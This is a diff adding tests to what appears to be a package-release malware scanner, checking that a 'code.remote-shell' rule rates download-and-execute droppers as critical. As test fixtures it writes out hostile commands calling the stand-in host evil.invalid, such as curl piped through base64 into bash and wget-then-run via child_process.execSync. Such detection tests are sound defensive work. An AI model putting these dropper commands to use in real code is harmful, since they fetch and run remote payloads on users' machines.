@@ -2193,6 +2193,24 @@ describe("computeRisk weighted multi-signal roll-up (issue #193)", () => {
     ).toBe("high");
   });
 
+  test("a lone remote-shell capability is not de-escalated", () => {
+    // `code.remote-shell` used to live inside `code.process-execution`, so
+    // `execSync('curl … | bash')` scored as one weak capability and the release
+    // rolled up to low — the gate then recommended approve. Shelling out to a
+    // compiler and shelling out to the network are not the same evidence.
+    expect(computeRisk([code("code.remote-shell", "high")])).toBe("high");
+    expect(computeRisk([code("code.remote-shell", "critical")])).toBe("critical");
+  });
+
+  test("co-occurrence is a floor, not a ceiling", () => {
+    // The co-occurrence branch used to return a flat "high", which meant adding a
+    // second capability could *lower* a critical one. Escalation must never
+    // de-escalate.
+    expect(
+      computeRisk([code("code.remote-shell", "critical"), code("code.process-execution", "high")]),
+    ).toBe("critical");
+  });
+
   test("an obfuscated lone capability is not de-escalated", () => {
     // Assembling `child_process` from string fragments is itself a malice signal,
     // so a lone obfuscated process-execution keeps its severity.
@@ -2538,5 +2556,168 @@ describe("baseline finding fingerprints", () => {
       { previousFiles: previous, stagedFiles: staged },
     );
     expect(annotated[0]).toMatchObject({ diffStatus: "modified", releaseDelta: true });
+  });
+});
+
+describe("code.remote-shell release-delta classification", () => {
+  const manifest = { name: "p", version: "1.0.1", main: "index.js" };
+
+  test("a decoy shell token in an untouched line does not hide the added dropper", () => {
+    // Regression: `patternsForFinding` had no case for `code.remote-shell`, so
+    // the rule could only be release-delta when its recorded line happened to
+    // be a changed line — and the recorded line is the *first* match in the
+    // file. Any pre-existing `curl`/`wget`/`nc` token earlier in the file (a
+    // comment, a usage string) pinned it to an unchanged line and dropped the
+    // newly added dropper out of `releaseRisk`, which is what the workflow gate
+    // reads. The gate then recommended approve.
+    const previousFiles = [
+      {
+        path: "package.json",
+        size: 40,
+        sha256: "a",
+        flags: [],
+        textSample: JSON.stringify({ name: "p", version: "1.0.0", main: "index.js" }),
+      },
+      {
+        path: "index.js",
+        size: 60,
+        sha256: "b",
+        flags: [],
+        textSample: "// see: curl https://example.invalid/docs\nconst a = 1;\n",
+      },
+    ];
+    const stagedFiles = [
+      {
+        path: "package.json",
+        size: 40,
+        sha256: "c",
+        flags: [],
+        textSample: JSON.stringify(manifest),
+      },
+      {
+        path: "index.js",
+        size: 160,
+        sha256: "d",
+        flags: [],
+        textSample:
+          "// see: curl https://example.invalid/docs\nconst a = 1;\n" +
+          'require("child_process").execSync("wget http://evil.invalid/p -O /tmp/p && /tmp/p");\n',
+      },
+    ];
+
+    const diff = createPackageDiff(previousFiles, stagedFiles);
+    const annotated = annotateFindingsWithDiffStatus(
+      deterministicFindings(stagedFiles, diff, manifest),
+      diff,
+      { previousFiles, stagedFiles },
+    );
+
+    const remoteShell = annotated.find((finding) => finding.ruleId === "code.remote-shell");
+    expect(remoteShell).toBeDefined();
+    // The recorded line is still the decoy on line 1 — that is where the first
+    // pattern match is — but the finding is release delta because the rule's
+    // patterns also match the added line.
+    expect(remoteShell.releaseDelta).toBe(true);
+    expect(computeRisk(annotated.filter((finding) => finding.releaseDelta))).toBe("high");
+  });
+});
+
+describe("code.remote-shell download-and-execute coverage", () => {
+  const manifest = { name: "p", version: "1.0.1", main: "index.js" };
+
+  function findingsFor(path, source) {
+    const stagedFiles = [
+      {
+        path: "package.json",
+        size: 40,
+        sha256: "c",
+        flags: [],
+        textSample: JSON.stringify(manifest),
+      },
+      { path, size: source.length, sha256: "d", flags: [], textSample: source },
+    ];
+    const diff = createPackageDiff([], stagedFiles);
+    return deterministicFindings(stagedFiles, diff, manifest).filter(
+      (finding) => finding.ruleId === "code.remote-shell",
+    );
+  }
+
+  // The download-and-execute regex used to require the interpreter token to sit
+  // immediately after the *first* pipe, so both the absolute-path form and any
+  // intermediate stage — `| base64 -d | bash` is the standard obfuscated
+  // dropper — fell back to the `high` tier that a bare shell tool earns.
+  test.each([
+    ["a bare interpreter", 'execSync("curl -s https://evil.invalid/p.sh | bash");'],
+    ["an absolute path", 'execSync("curl -s https://evil.invalid/p.sh | /bin/bash");'],
+    ["a base64 stage", 'execSync("curl -s https://evil.invalid/p | base64 -d | bash");'],
+    ["a decompression stage", 'execSync("curl -sL https://evil.invalid/p.gz | gunzip | sh");'],
+    ["a privilege prefix", 'execSync("curl -s https://evil.invalid/p.sh | sudo -E bash");'],
+    ["an env prefix", 'execSync("wget -qO- https://evil.invalid/p.sh | env sh");'],
+    ["a versioned interpreter", 'execSync("curl -s https://evil.invalid/p | python3.11 -");'],
+    ["backtick substitution", "execSync(`eval \\`curl -s https://evil.invalid/p\\``);"],
+  ])("pipes into %s at critical", (_label, command) => {
+    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
+    expect(findings).toHaveLength(1);
+    expect(findings[0].severity).toBe("critical");
+  });
+
+  // The trailing word boundary is what separates an interpreter from a
+  // checksum tool; without it `| sha256sum` reads as `sh`.
+  test.each([
+    ["sha256sum", 'execSync("curl -s https://example.invalid/f | sha256sum");'],
+    ["shasum", 'execSync("curl -s https://example.invalid/f | shasum -a 256");'],
+  ])("does not read %s as an interpreter", (_label, command) => {
+    const findings = findingsFor("index.js", `require("child_process").${command}\n`);
+    expect(findings[0]?.severity).not.toBe("critical");
+  });
+
+  test("a curl mentioned only in comments does not raise a capability", () => {
+    // The executor requirement is satisfied by any spawn API in the same file,
+    // so a CLI that both shells out and documents its HTTP equivalent — the
+    // most common real shape — used to raise `high` on prose.
+    const findings = findingsFor(
+      "cli.js",
+      'import { execFileSync } from "node:child_process";\n' +
+        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
+        "/*\n * Or: wget -qO- https://api.example.invalid/v1/status\n */\n" +
+        'export const branch = () => execFileSync("git", ["rev-parse", "HEAD"]);\n',
+    );
+    expect(findings).toHaveLength(0);
+  });
+
+  test("a real command on a code line still raises a capability", () => {
+    const findings = findingsFor(
+      "cli.js",
+      'import { execSync } from "node:child_process";\n' +
+        "// Equivalent to: curl -X POST https://api.example.invalid/v1/deploys\n" +
+        'export const sync = () => execSync("curl -s https://api.example.invalid/v1/sync");\n',
+    );
+    expect(findings).toHaveLength(1);
+    expect(findings[0].severity).toBe("high");
+  });
+
+  // Build infrastructure runs on a CI runner at build time, never on a
+  // consumer's install, and every mainstream toolchain documents this idiom.
+  test.each([
+    ["Dockerfile", "RUN curl -fsSL https://deb.nodesource.com/setup_18.x | bash -\n"],
+    [".github/workflows/ci.yml", "      - run: curl -LsSf https://astral.sh/uv/install.sh | sh\n"],
+    ["Makefile", "bootstrap:\n\tcurl -sSL https://install.python-poetry.org | python3 -\n"],
+    ["docker/Dockerfile.alpine", "RUN wget -qO- https://example.invalid/install.sh | sh\n"],
+    [".circleci/config.yml", "      - run: curl -fsSL https://get.pnpm.io/install.sh | sh -\n"],
+  ])("does not fire on %s", (path, source) => {
+    expect(findingsFor(path, source)).toHaveLength(0);
+  });
+
+  test("build infrastructure that also spawns keeps the lower tier", () => {
+    // The exemption and the critical tier are withheld together: if something
+    // else in the file satisfies the executor requirement, the finding is still
+    // a bare shell-tool capability, not download-and-execute.
+    const findings = findingsFor(
+      "Dockerfile.build",
+      "RUN node -e \"require('child_process').execSync('echo hi')\"\n" +
+        "RUN curl -fsSL https://example.invalid/setup.sh | bash\n",
+    );
+    expect(findings).toHaveLength(1);
+    expect(findings[0].severity).toBe("high");
   });
 });
